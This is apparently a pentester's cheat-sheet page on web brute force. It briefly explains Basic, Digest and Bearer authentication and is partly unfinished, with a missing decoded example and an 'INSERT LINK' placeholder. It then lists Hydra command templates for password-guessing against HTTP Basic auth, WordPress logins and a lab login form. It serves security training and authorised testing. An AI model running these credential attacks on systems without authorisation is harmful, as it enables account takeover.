# Brute Force (Web)

## Theory

### Authentication types

**Basic Authentication** (`Authorization: Basic YWRtaW46YWRtaW4=`): The format is in base64 and when decoded you see:

Other authorization types are **Digest** and **Bearer**. The Digest type is used to hash credentials using the MD5 hash algorithm. This avoids transmitting credentials in clear text, unlike Basic. More detailed information on the process can be found here.

The **Bearer** type, on the other hand, is used to send "tokens", which identify the client. These tokens can be defined and created by applications as they wish. They are usually associated with the OAuth authorization framework. They are used for JWTs (Json Web Tokens):

INSERT LINK TO: JWT

## Practice

```bash
# Basic authorization
hydra -t <THREADS> -l <USERNAME> -P <WORDLIST> <IP/DOMAIN> http-get "/"
hydra -t <HILOS> -l <USERNAME> -P <WORDLIST> <IP/DOMAIN> http-head "/"
# WordPress
hydra <IP/DOMAIN> -l <USERNAME> -P <WORDLIST> -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
# HTTP POST
hydra <IP/DOMAIN> -L users.txt -P passwords.txt http-form-post "/owaspbricks/login-3/index.php:username=^USER^&passwd=^PASS^&submit=submit:<ERROR MESSAGE>"
```
